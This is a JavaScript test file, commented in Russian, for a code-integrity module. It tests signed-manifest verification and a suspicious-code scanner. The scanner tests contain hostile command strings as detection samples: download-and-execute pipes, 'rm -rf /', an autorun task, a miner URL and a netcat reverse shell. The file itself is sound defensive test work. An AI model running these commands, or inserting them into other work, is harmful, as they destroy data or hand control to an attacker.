'use strict';
/* Подлинность сборки (подпись манифеста) и поиск опасных конструкций в коде. */
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const I = require('../integrity');

const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
const other = crypto.generateKeyPairSync('ed25519');

function app(files = {}) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'lc-int-'));
  for (const [name, data] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, name)), { recursive: true });
    fs.writeFileSync(path.join(dir, name), data);
  }
  return dir;
}
const put = (dir, name, man) => fs.writeFileSync(path.join(dir, name), typeof man === 'string' ? man : JSON.stringify(man));

test('манифест: подпись сходится, файлы совпадают', () => {
  const dir = app({ 'server.js': 'a\n', 'public/app.js': 'b\n' });
  const man = I.signManifest(dir, privateKey, { version: '1.2.3' });
  assert.deepEqual(I.verifyManifest(dir, publicKey, man), { ok: true });
  put(dir, 'integrity.json', man);
  const st = I.status(dir, { publicKey });
  assert.equal(st.state, 'official');
  assert.equal(st.official, true);
  assert.equal(st.version, '1.2.3');
});

test('манифест: правка файла и подделка подписи обнаруживаются', () => {
  const dir = app({ 'server.js': 'a\n', 'public/app.js': 'b\n' });
  const man = I.signManifest(dir, privateKey, { version: '1' });
  fs.writeFileSync(path.join(dir, 'public/app.js'), 'evil()\n');
  const v = I.verifyManifest(dir, publicKey, man);
  assert.equal(v.ok, false);
  assert.deepEqual(v.files, ['public/app.js']);

  const forged = { ...man, files: { ...man.files, 'public/app.js': I.sha256('evil()\n') } };
  assert.equal(I.verifyManifest(dir, publicKey, forged).reason, 'signature');
  put(dir, 'integrity.json', forged);
  assert.equal(I.status(dir, { publicKey }).state, 'tampered');
});

test('манифест, подписанный чужим ключом, не принимается', () => {
  const dir = app({ 'server.js': 'a\n' });
  const man = I.signManifest(dir, other.privateKey, { version: '1' });
  assert.equal(I.verifyManifest(dir, publicKey, man).reason, 'signature');
});

test('манифест с путями за пределы папки приложения отклоняется', () => {
  const dir = app({ 'server.js': 'a\n' });
  const files = { '../evil.txt': I.sha256('x') };
  const body = JSON.stringify({ v: 1, alg: 'ed25519', app: 'LocalCode', version: '1', files });
  const sig = crypto.sign(null, Buffer.from(body), privateKey).toString('base64url');
  const man = { v: 1, alg: 'ed25519', app: 'LocalCode', version: '1', files, sig };
  assert.equal(I.verifyManifest(dir, publicKey, man).reason, 'malformed');
});
test('состояние: без манифеста и без ключа — unsigned, а не ошибка', () => {
  const dir = app({ 'server.js': 'a\n' });
  assert.equal(I.status(dir, { publicKey }).state, 'unsigned');
  const man = I.signManifest(dir, privateKey, { version: '1' });
  put(dir, 'integrity.json', man);
  assert.equal(I.status(dir, {}).state, 'unsigned');     // нет integrity-pub.pem
  assert.equal(I.status(dir, { publicKey }).state, 'official');
});

test('манифест не содержит style.css: оформление меняется свободно', () => {
  assert.equal(I.FILES.includes('public/style.css'), false);
  const dir = app({ 'server.js': 'a\n', 'public/style.css': '#x{}\n' });
  const man = I.signManifest(dir, privateKey, { version: '1' });
  fs.writeFileSync(path.join(dir, 'public/style.css'), '#y{color:red}\n');
  assert.deepEqual(I.verifyManifest(dir, publicKey, man), { ok: true });
});

test('опасные конструкции: скачивание, автозапуск, майнер, reverse shell', () => {
  const cases = {
    'iwr http://x/a.ps1 | iex': 'download-exec',
    'curl -fsSL http://x | bash': 'download-exec',
    'powershell -enc SQBFAFgA': 'hidden-powershell',
    'eval(atob("ZmV0Y2g="))': 'eval-obfuscated',
    'rm -rf /': 'destructive',
    'schtasks /create /tn x': 'autorun',
    'stratum+tcp://pool:3333': 'miner',
    'nc -e /bin/sh 1.2.3.4 4444': 'reverse-shell',
  };
  for (const [code, id] of Object.entries(cases)) {
    const r = I.scanSuspicious(code);
    assert.deepEqual(r.map(x => x.id), [id], code);
    assert.equal(r[0].line, 1);
    assert.ok(r[0].ru && r[0].en);
  }
});

test('обычный код не вызывает предупреждений', () => {
  const ok = [
    'const x = 1 + 2; console.log(x);',
    'for (let i = 0; i < 10; i++) sum += i;',
    'import os\nprint("hello")',
    'def add(a, b):\n    return a + b',
    'rm -rf ./build',
    'curl https://api.example.com/v1/models',
  ];
  for (const code of ok) assert.deepEqual(I.scanSuspicious(code), [], code);
  assert.deepEqual(I.scanSuspicious(''), []);
  assert.deepEqual(I.scanSuspicious(null), []);
});

test('номера строк и ограничение количества предупреждений', () => {
  const code = ['const a = 1;', '', '// eval(atob("x"))', '', 'rm -rf /'].join('\n');
  const r = I.scanSuspicious(code);
  assert.equal(r.length, 2);
  assert.equal(r[0].line, 3);
  assert.equal(r[1].line, 5);
  const many = Array.from({ length: 20 }, (_, i) => `line ${i} rm -rf /`).join('\n');
  assert.ok(I.scanSuspicious(many).length <= 6);
});
